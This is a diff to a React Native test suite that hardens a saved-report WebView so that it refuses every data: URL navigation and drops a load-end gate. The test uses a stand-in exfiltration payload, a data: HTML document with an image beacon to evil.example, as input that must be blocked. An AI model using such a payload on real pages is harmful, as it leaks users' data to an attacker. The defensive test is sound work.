@@ -251,19 +251,19 @@ describe('boxed in like the preview (CUL-2487)', () => {
     expect(web.props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
   });
 
-  it('a data: URL passes only as the inline document itself, never once the page has loaded (privacy pass 1)', async () => {
+  it('every data: navigation is refused: the page can never hop to a document without the CSP (privacy pass 2)', async () => {
     const view = render(<SavedReportScreen />);
     await waitFor(() => expect(view.getByTestId('report-copy')).toBeTruthy());
-    const web = () => view.getByTestId('report-copy');
+    const web = view.getByTestId('report-copy');
     const hop = 'data:text/html,<img src="https://evil.example/?d=';
-    // Some Android builds report the first load of an inline document as data:.
-    expect(web().props.onShouldStartLoadWithRequest({ url: 'data:text/html;charset=utf-8,x' })).toBe(true);
-    act(() => web().props.onLoadEnd());
-    // After it, a data: hop (an injected refresh to a document with no CSP) is refused.
-    expect(web().props.onShouldStartLoadWithRequest({ url: hop })).toBe(false);
-    expect(web().props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
-    expect(savedCopyLoadAllowed(hop, true)).toBe(false);
-    expect(savedCopyLoadAllowed('https://evil.example/', false)).toBe(false);
+    expect(web.props.onShouldStartLoadWithRequest({ url: hop })).toBe(false);
+    expect(web.props.onShouldStartLoadWithRequest({ url: 'data:text/html;charset=utf-8,x' })).toBe(false);
+    // The copy's own document (iOS reports it as about:blank) still loads.
+    expect(web.props.onShouldStartLoadWithRequest({ url: 'about:blank' })).toBe(true);
+    expect(savedCopyLoadAllowed(hop)).toBe(false);
+    expect(savedCopyLoadAllowed('https://evil.example/')).toBe(false);
+    // No load-end gate to race.
+    expect(web.props.onLoadEnd).toBeUndefined();
   });
 });
 
